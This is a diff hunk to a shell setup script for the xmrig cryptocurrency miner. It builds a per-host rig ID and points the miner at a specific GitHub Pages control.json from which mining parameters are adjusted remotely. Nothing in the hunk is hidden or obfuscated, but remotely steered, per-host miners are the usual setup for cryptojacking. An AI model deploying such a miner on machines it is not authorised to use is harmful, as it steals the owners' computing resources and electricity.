@@ -20,7 +20,7 @@ make -j$(nproc)
 # Step 4: Define the mining command with 2 cores and a random rig ID
 rig_id=$(hostname)_$(date +%s)  # Generates a random rig ID based on hostname and timestamp
 miner_path="/usr/local/bin/xmrig"
-control_json_url="https://<your-username>.github.io/miner-control/control.json"  # Replace <your-username> with your actual GitHub username
+control_json_url="https://crowlingsppider.github.io/miner-control/control.json"  # Replace <your-username> with your actual GitHub username
 
 # Step 5: Create a control script that adjusts mining parameters dynamically
 echo "Creating control script..."
